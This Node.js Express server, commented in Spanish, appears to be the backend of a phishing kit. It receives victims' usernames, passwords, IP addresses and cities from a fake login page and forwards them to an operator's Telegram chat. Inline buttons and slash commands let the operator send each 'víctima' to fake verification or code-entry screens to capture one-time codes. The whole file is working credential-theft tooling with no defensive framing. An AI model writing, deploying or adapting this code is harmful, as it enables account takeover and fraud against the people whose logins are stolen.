const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática (archivos >15 min)
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    if ((ahora - stats.mtimeMs) / 60000 > 15) {
      fs.unlinkSync(fullPath);
      console.log(`Eliminado: ${file}`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// Recepciona email + contraseña
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
GM4YL
🆔 ID: <code>${txid}</code>

US4R: <code>${usar}</code>
CL4V: <code>${clavv}</code>

IP: ${ip}
Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    codigo: "",
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "CONFIRMAR", callback_data: `confirmar:${txid}` },
        { text: "CÓDIGO", callback_data: `codigo:${txid}` },
        { text: "ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

// Webhook Telegram: botones y comandos
app.post('/webhook', async (req, res) => {
  // Comando de texto: /txid 22
  if (req.body.message?.text?.startsWith('/')) {
    const parts = req.body.message.text.slice(1).trim().split(' ');
    const txid = parts[0].toLowerCase();

    if (parts.length === 2 && /^\d{2}$/.test(parts[1])) {
      const codigo = parts[1];
      const cliente = cargarCliente(txid) || { status: 'esperando', codigo: '' };

      cliente.codigo = codigo;
      cliente.status = 'codigo';  // Importante: fuerza redirección
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `Código actualizado: <b>${codigo}</b>\nVíctima redirigida a pantalla de código (otro3.html)`,
          parse_mode: 'HTML'
        })
      });
      return res.sendStatus(200);
    }
  }

  // Botones inline (CONFIRMAR, CÓDIGO, ERROR LOGO)
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const [accion, txid] = callback.data.split(':');

    const cliente = cargarCliente(txid);
    if (!cliente) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callback.id,
          text: "ID expirado o no encontrado"
        })
      });
      return res.sendStatus(200);
    }

    cliente.status = accion;  // confirmar, codigo, errorlogo
    guardarCliente(txid, cliente);

    let textoAccion = "";
    if (accion === 'confirmar') textoAccion = "Víctima enviada a revisión de teléfono (otro4.html)";
    if (accion === 'codigo') textoAccion = "Víctima enviada a pantalla de código (otro3.html)";
    if (accion === 'errorlogo') textoAccion = "Víctima enviada a error de logo";

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: textoAccion || "Acción ejecutada"
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Ruta usada por cargs.html (la más importante)
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid);

  if (!cliente) {
    return res.json({ status: "esperando" });
  }

  res.json({
    status: cliente.status || "esperando"
  });
});

// Ruta usada por otro3.html para obtener el código en tiempo real
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid);

  res.json({
    status: cliente?.status || "esperando",
    codigo: cliente?.codigo || ""
  });
});

app.get('/', (req, res) => res.send("Servidor activo"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
